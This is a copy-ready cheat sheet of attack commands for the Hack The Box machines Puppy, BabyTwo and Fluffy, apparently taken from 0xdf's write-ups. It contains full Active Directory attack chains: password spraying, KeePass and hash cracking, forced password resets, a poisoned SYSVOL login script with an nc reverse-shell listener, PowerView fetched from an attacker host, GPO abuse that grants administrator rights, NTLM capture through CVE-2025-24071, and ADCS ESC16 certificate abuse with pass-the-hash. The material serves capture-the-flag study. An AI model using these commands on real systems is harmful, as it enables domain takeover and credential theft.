# HTB Commands — Additional Machines (from 0xdf.gitlab.io)

> Beautified collection of commands for HTB machines: **Puppy**, **BabyTwo**, and **Fluffy**.  
> Commands are grouped by machine, purpose, and presented in copy-ready code blocks.

---

## Table of Contents
- [Puppy](#puppy)
  - [Recon](#puppy-recon)
  - [Auth as Ant.Edwards](#auth-as-antedwards)
  - [Shell as Adam.Silver](#shell-as-adamsilver)
- [BabyTwo](#babytwo)
  - [Recon](#babytwo-recon)
  - [Shell as Amelia.Griffiths](#shell-as-ameliagriffiths)
  - [Auth as GPOADM & Exploit](#auth-as-gpoadm--exploit)
- [Fluffy](#fluffy)
  - [Recon](#fluffy-recon)
  - [ADCS & Exploits](#fluffy-adcs--exploits)
  - [Shells (winrm_svc & Administrator)](#fluffy-shells)

---

# Puppy

## Puppy — Recon

### Initial Scanning
```bash
nmap -p- --min-rate 10000 10.10.11.70
nmap -p 53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389 -vv -sCV 10.10.11.70
```

### Initial Credentials
```bash
netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!'
netexec ldap puppy.htb -u levi.james -p 'KingofAkron2025!'
netexec winrm puppy.htb -u levi.james -p 'KingofAkron2025!'
```

### SMB - TCP 445
```bash
netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares
smbclient //puppy.htb/dev -U 'levi.james%KingofAkron2025!'
netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --users
```

### Bloodhound / Timing
```bash
sudo ntpdate puppy.htb
bloodhound-ce-python -c all -d puppy.htb -u levi.james -p 'KingofAkron2025!' -ns 10.10.11.70 --zip
```

---

## Puppy — Auth as Ant.Edwards

### Access DEV Share & retrieve KeePass
```bash
net rpc group addmem developers levi.james -U puppy.htb/levi.james%'KingofAkron2025!' -S puppy.htb
net rpc group members developers -U puppy.htb/levi.james%'KingofAkron2025!' -S puppy.htb
netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares
smbclient -U puppy.htb/levi.james //puppy.htb/dev --password 'KingofAkron2025!'
get recovery.kdbx
```

### Crack KeePassXC & Export
```bash
john-the-ripper.keepass2john recovery.kdbx | tee recovery.kdbx.hash
john-the-ripper recovery.kdbx.hash --wordlist=rockyou.txt
keepassxc.cli export --format csv recovery.kdbx    # (password: liverpool)
```

### Password Spray (extract users / passwords)
```bash
netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --users | grep -vF -e '[' -e '-Username-' | awk '{print $5}' | tee users.txt
echo 'liverpool' | keepassxc.cli export --format csv recovery.kdbx | cut -d'"' -f8 | tee passwords.txt
netexec smb puppy.htb -u users.txt -p passwords.txt --continue-on-success | grep -F '[+]'
netexec smb puppy.htb -u ant.edwards -p 'Antman2025!'
netexec winrm puppy.htb -u ant.edwards -p 'Antman2025!'
```

---

## Puppy — Shell as Adam.Silver

### Password Change & Account Enable
```bash
net rpc password adam.silver '0xdf0xdf.' -U puppy.htb/ant.edwards%'Antman2025!' -S puppy.htb
netexec smb puppy.htb -u adam.silver -p '0xdf0xdf.'
bloodyAD -u ant.edwards -p 'Antman2025!' --host dc.puppy.htb -d puppy.htb remove uac adam.silver -f ACCOUNTDISABLE
netexec smb puppy.htb -u adam.silver -p '0xdf0xdf.'
netexec winrm puppy.htb -u adam.silver -p '0xdf0xdf.'
evil-winrm -i puppy.htb -u adam.silver -p 0xdf0xdf.
cat user.txt
```

### Enumeration & Backup Retrieval
```bash
tree /f
ls
download site-backup-2024-12-30.zip
unzip -l site-backup-2024-12-30.zip
unzip site-backup-2024-12-30.zip puppy/nms-auth-config.xml.bak
cat puppy/nms-auth-config
```

---

# BabyTwo

## BabyTwo — Recon

### Initial Scanning
```bash
nmap -p- -vvv --min-rate 10000 10.129.194.134
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -sCV 10.129.194.134
```

## BabyTwo — SMB (TCP 445)

### Share Enumeration & Helpers
```bash
netexec smb 10.129.194.134 --generate-hosts-file hosts
cat hosts
cat hosts /etc/hosts | sudo sponge /etc/hosts
netexec smb dc.baby2.vl -u guest -p '' --shares
smbclient -N //dc.baby2.vl/homes
netexec smb dc.baby2.vl -u guest -p '' -M spider_plus
cat spider_plus.json | jq 'with_entries({key, value: (.value | keys)})'
smbclient -N //dc.baby2.vl/apps
lnkparse login.vbs.lnk
```

### Users Enumeration via RID brute
```bash
netexec smb dc.baby2.vl -u guest -p '' --users
netexec smb dc.baby2.vl -u guest -p '' --rid-brute
netexec smb dc.baby2.vl -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users
```

---

## BabyTwo — Shell as Amelia.Griffiths

### Auth as library / Carl.Moore
```bash
netexec smb dc.baby2.vl -u users -p users --no-bruteforce --continue-on-success
```

### BloodHound collection
```bash
netexec ldap dc.baby2.vl -u library -p library --bloodhound -c All --dns-server 10.129.194.134
```

### SMB / SYSVOL interaction
```bash
netexec smb dc.baby2.vl -u library -p library --shares
netexec smb dc.baby2.vl -u Carl.Moore -p Carl.Moore --shares
smbclient //dc.baby2.vl/SYSVOL -U Carl.Moore%Carl.Moore
ls
cd baby2.vl\
cd scripts\
put hosts login.vbs
```

### Poison login.vbs & get shell
```bash
tail login-revshell.vbs
rlwrap -cAr nc -lnvp 443
whoami
cat user.txt
```

---

## BabyTwo — Auth as GPOADM & Exploit to Administrators

### Permission escalation via GPO abuse
```bash
curl 10.10.14.204/PowerView.ps1 -outfile PowerView.ps1
. .\PowerView.ps1
Add-DomainObjectAcl -Rights all -TargetIdentity GPOADM -PrincipalIdentity Amelia.Griffiths
$cred = ConvertTo-SecureString '0xdf0xdf.' -AsPlainText -Force
Set-DomainUserPassword GPOADM -AccountPassword $cred
netexec smb dc.baby2.vl -u GPOADM -p 0xdf0xdf.
```

### Exploit GPO to add to Administrators
```bash
git clone https://github.com/Hackndo/pyGPOAbuse.git
cd pyGPOAbuse/
uv add --script pygpoabuse.py -r requirements.txt
uv run --script pygpoabuse.py baby2.vl/GPOADM:0xdf0xdf. -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command 'net localgroup administrators GPOADM /add' -f
net localgroup Administrators
netexec smb dc.baby2.vl -u GPOADM -p 0xdf0xdf.
evil-winrm-py -i dc.baby2.vl -u GPOADM -p 0xdf0xdf.
cat root.txt
```

---

# Fluffy

## Fluffy — Recon

### Initial Scanning
```bash
nmap -p- --min-rate 10000 10.10.11.69
nmap -p 53,88,139,389,445,464,593,636,3268,3269,5985 -vv -sCV 10.10.11.69
```

### Initial Credentials & host file
```bash
netexec smb 10.10.11.69 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
netexec winrm dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
```

### ADCS enumeration
```bash
netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -M adcs
certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout
certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -stdout
```

## Fluffy — SMB & BloodHound
```bash
netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
smbclient //dc01.fluffy.htb/software -U 'j.fleischman%J0elTHEM4n1990!'
ntpdate dc01.fluffy.htb
bloodhound-ce-python -c all -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -ns 10.10.11.69 --zip
```

## Fluffy — Exploit CVE-2025-24071 / CVE-2025-24055
```bash
responder -I tun0 -v
zip exploit.zip exploit.library-ms
smbclient //dc01.fluffy.htb/software -U 'j.fleischman%J0elTHEM4n1990!'
put exploit.zip
ls
```

### Crack Hash & pivot
```bash
hashcat p.agila.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
netexec smb dc01.fluffy.htb -u p.agila -p 'prometheusx-303'
netexec winrm dc01.fluffy.htb -u p.agila -p 'prometheusx-303'
```

## Fluffy — winrm_svc -> Administrator via ADCS (ESC16 flow)

### winrm_svc shell & enumeration
```bash
bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc
evil-winrm-py -i dc01.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
cat user.txt
```

### Administrator via ESC16 (cert abuse)
```bash
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update
certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -u administrator -domain fluffy.htb
evil-winrm-py -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
cat root.txt
```

---

*File generated & prettified — ready to download.*
